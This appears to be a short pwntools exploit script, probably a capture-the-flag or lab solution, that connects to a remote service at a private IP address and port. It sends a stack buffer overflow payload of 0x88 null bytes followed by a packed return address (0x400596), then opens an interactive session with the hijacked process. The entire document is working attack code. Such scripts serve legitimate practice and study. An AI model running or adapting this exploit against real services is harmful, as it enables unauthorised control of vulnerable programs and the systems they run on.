from pwn import *
p=remote('10.0.2.8',12345)
#p=process('.')

payload=b'\x00'*(0x88)+p64(0x400596)

p.send(payload)

p.interactive()